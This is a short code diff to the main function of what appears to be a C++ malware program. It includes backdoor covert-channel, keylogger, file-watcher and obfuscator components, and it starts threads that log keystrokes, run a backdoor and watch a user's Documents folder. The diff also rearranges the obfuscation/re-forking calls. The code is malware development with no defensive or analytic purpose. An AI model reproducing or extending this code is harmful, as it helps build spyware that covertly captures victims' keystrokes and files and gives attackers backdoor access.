@@ -2,7 +2,7 @@
 #include "covert_channel/backdoor_channel.h"
 #include "keylogger/keylogger.h"
 #include "file_watcher/file_watcher.h"
-#include "obfuscator/refork.h"
+//#include "obfuscator/refork.h"
 #include <thread>
 #include <sys/inotify.h>
 
@@ -17,11 +17,9 @@ int main(){
     std::thread kl_thread(&Key_Logger::start, &kl);
     std::thread fw_thread(&File_Watcher::start, &fw, "/home/dimitry/Documents", IN_CLOSE_WRITE);
     
-
+    //refork_init(1);
+    //refork();
     bd_thread.join();
     kl_thread.join();
     fw_thread.join();
-
-    init();
-    forkit();
 }
